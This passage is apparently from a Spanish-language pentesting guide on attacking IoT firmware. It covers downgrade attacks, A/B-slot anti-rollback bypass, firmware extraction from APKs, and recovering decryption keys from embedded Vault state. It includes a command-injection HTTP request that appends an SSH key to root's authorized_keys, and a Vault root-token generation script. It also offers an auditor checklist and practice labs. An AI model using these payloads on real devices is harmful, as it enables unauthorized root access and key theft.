   * Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de un APK de Android, en `assets/firmware/`).
   * Consíguela en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube o sirve la imagen al dispositivo** mediante cualquier canal de actualización expuesto:
   * Interfaz web, API de aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor e inician el proceso de recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión más reciente (por ejemplo, un filtro de command injection añadido posteriormente).
4. Opcionalmente, vuelve a instalar la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection después de un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (downgradeado), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrades hace que la corrección sea ineficaz.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes completas de firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo mediante Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de la protección anti-retroceso solo en el updater en diseños con slots A/B

Algunos proveedores implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en espacio de usuario). Si el **bootloader** luego solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o los metadatos del slot, todavía es posible eludir la protección contra retrocesos.<sup>[[7]](#references)</sup>

Diseño débil habitual:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **ratchet de seguridad** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El **bootloader** no analiza ese ratchet y solo verifica la cabecera, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot y **no está vinculada criptográficamente** al digest exacto del firmware validado.

Esto crea una primitiva de **validar una imagen / arrancar otra** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como próximo destino de arranque usando una imagen firmada actual y, después, sobrescribir el slot B antes del reinicio, el bootloader podría arrancar la imagen degradada porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso habitual:

1. Cargar un firmware **actual y firmado** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el diseño marque ese slot como el siguiente activo.
2. **No reiniciar todavía**. Volver a ejecutar la rutina de preparación/borrado del slot en la misma sesión.
3. Abusar de un estado de arranque obsoleto o de una lógica obsoleta de selección de slot para que el updater borre el **mismo slot físico** que acaba de activar.
4. Escribir en ese slot un firmware **más antiguo, pero aún firmado**.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot activado, solo verifica la firma/integridad y arranca la imagen antigua.

Aspectos que conviene revisar al analizar mediante ingeniería inversa las implementaciones de actualización A/B:

- Selección de slot derivada de **flags de arranque** que no se actualizan tras un cambio correcto.
- Una rutina del estilo `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto en vez del **diseño confirmado actual**.
- Una función del estilo `part_write_layout()` que solo incrementa un **contador de generación** / flag de activo y no guarda el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en el espacio de usuario o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de que su contenido se haya borrado y reescrito.

### Lista de comprobación para evaluar la lógica de actualización

* ¿Está suficientemente protegida la autenticación/transmisión del *endpoint de actualización* (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-retroceso** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (por ejemplo, con firmas comprobadas por el código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en vez de limitarse a comprobar la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de activarlo?
* Después de que se completa correctamente un cambio de slot, ¿se fuerza el reinicio del dispositivo o siguen estando accesibles otras rutinas de actualización/borrado en la misma sesión?
* ¿El código de userland realiza comprobaciones adicionales de coherencia (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parcial* o de *respaldo* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, es probable que la plataforma sea vulnerable a ataques de retroceso.

## Firmware vulnerable para practicar

Para practicar la detección de vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado de firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina pequeños metadatos en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta:<sup>[[1]](#references)</sup>

- Vuelca las cabeceras, los offsets y los límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la salt y el resto son el texto cifrado.
- Un campo Base64 que se decodifica en exactamente `256` bytes es una pista sólida de que se trata de un texto cifrado RSA-2048 que envuelve una contraseña aleatoria del firmware o una clave de sesión.
- El material PGP separado en el mismo archivo suele proteger únicamente la autenticidad; no des por hecho que es el mecanismo de confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas de PEM/PGP) no da resultado, analiza mediante ingeniería inversa la **ruta de descifrado operativa** en lugar de limitarte a buscar claves privadas:

- Descompila el updater / binario de gestión y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre de clave lógico solicita.
- Busca en el sistema de archivos raíz extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de los archivos de unidad y los scripts de inicio.
- Trata los comandos en texto plano `vault operator unseal ...`, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes a material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, suele ser más sencillo reproducir ese entorno que volver a implementar las funciones internas de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root en el KMS clonado:

- Haz que las claves de transit solo sean exportables dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave de unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos basados en Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza con `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos antiguos) antes de intentar el descifrado AES-CBC.

Esto convierte el problema del «firmware cifrado» en uno más general: **recuperar las claves operativas del dispositivo y, luego, reproducir offline los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrado de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero-days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 dólares me dio acceso a tu casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde su conector de carga - Parte 2: elusión de la protección contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 2: depuración y corrección](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Contraseñas de Dell BIOS: el cifrado XOR débil permite recuperarlas desde la memoria SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Herramientas para recuperar contraseñas de Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
